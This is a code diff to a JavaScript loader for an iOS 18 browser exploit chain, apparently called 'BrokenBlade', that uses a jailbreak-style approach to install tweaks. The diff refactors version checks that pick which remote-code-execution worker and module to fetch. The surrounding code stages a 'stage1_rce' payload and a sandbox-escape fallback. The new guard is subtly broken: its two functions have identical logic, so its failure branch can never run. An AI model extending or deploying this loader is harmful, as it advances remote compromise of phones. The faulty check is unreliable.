@@ -194,17 +194,45 @@ const ios_version = (function() {
     print("WARNING: Could not detect iOS version from UA!");
     return null;
 })();
+function iosVersionString(version) {
+    return Array.isArray(version) ? version.join('.') : String(version || '');
+}
+function iosVersionKey(version) {
+    return Array.isArray(version) ? version.join(',') : String(version || '');
+}
+function isIos186Path(version) {
+    const key = iosVersionKey(version);
+    return key === '18,6' || key === '18,6,1' || key === '18,6,2';
+}
+function hasBundledOffsetSupport(version) {
+    if (!Array.isArray(version) || version.length < 2) return false;
+    const major = version[0];
+    const minor = version[1];
+    const patch = version.length > 2 ? version[2] : 0;
+    return major === 18 && (minor < 6 || (minor === 6 && patch <= 2));
+}
+function isTheoreticalIos18Window(version) {
+    if (!Array.isArray(version) || version.length < 2) return false;
+    const major = version[0];
+    const minor = version[1];
+    const patch = version.length > 2 ? version[2] : 0;
+    return major === 18 && (minor < 6 || (minor === 6 && patch <= 2));
+}
+if (isTheoreticalIos18Window(ios_version) && !hasBundledOffsetSupport(ios_version)) {
+    fail("iOS " + iosVersionString(ios_version) + " is in the theoretical CVE window, but BrokenBlade does not yet bundle offsets/RCE config for this build");
+    throw new Error("missing bundled offsets for theoretical iOS 18 target");
+}
 print("Tweak selection: mode=" + (globalThis.__ls_run_mode || 'install') + " tweaks=" + (globalThis.__ls_tweaks || '(none)') + " level=" + (globalThis.__ls_powercuff_level || '(none)') + " sbc=" + globalThis.__ls_sbc_dock_icons + "/" + globalThis.__ls_sbc_hs_cols + "x" + globalThis.__ls_sbc_hs_rows + " rawSearch=" + (location.search || '(empty)'));
 print("Loading worker code...");
 let workerCode = "";
-if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2') {
+if(isIos186Path(ios_version)) {
     print("Using worker for iOS 18.6.x");
     workerCode = getJS(`rce_worker_18.6.js?${Date.now()}`); // local version
     if (!workerCode || !workerCode.trim()) {
         workerCode = getJS(`rce_worker.js?${Date.now()}`);
     }
 } else {
-    print("Using worker for iOS 18.4.x");
+    print("Using worker for iOS 18.4-18.5 path");
     workerCode = getJS(`rce_worker.js?${Date.now()}`); // local version
 }
 if (!workerCode || !workerCode.trim()) {
@@ -362,7 +390,7 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
         try
         {
         let rceCode = "";
-        if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2') {
+        if(isIos186Path(ios_version)) {
                 rceCode = getJS(`rce_module_18.6.js?${Date.now()}`); // local version
             } else {
                 rceCode = getJS(`rce_module.js?${Date.now()}`); // local version
@@ -384,7 +412,7 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
         let desiredHost = "";
         desiredHost = localHost;
         print("desiredHost = " + desiredHost);
-            if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
+            if(isIos186Path(ios_version))
             {
                 print("Sending stage1_rce to worker (iOS 18.6 path) tweaks=" + (globalThis.__ls_tweaks || 'fiveicon') + " level=" + (globalThis.__ls_powercuff_level || 'heavy') + " sbx0FallbackStart=" + (globalThis.__ls_sbx0_fallback_start || 0));
                 worker.postMessage({
@@ -411,7 +439,7 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
             }
             else
             {
-                print("Starting check_attempt (iOS 18.4 path), sbx0FallbackStart=" + (globalThis.__ls_sbx0_fallback_start || 0));
+                print("Starting check_attempt (iOS 18.4-18.5 path), sbx0FallbackStart=" + (globalThis.__ls_sbx0_fallback_start || 0));
         var attempt = new check_attempt();
         (async function() {
             var maxRetries = 5;
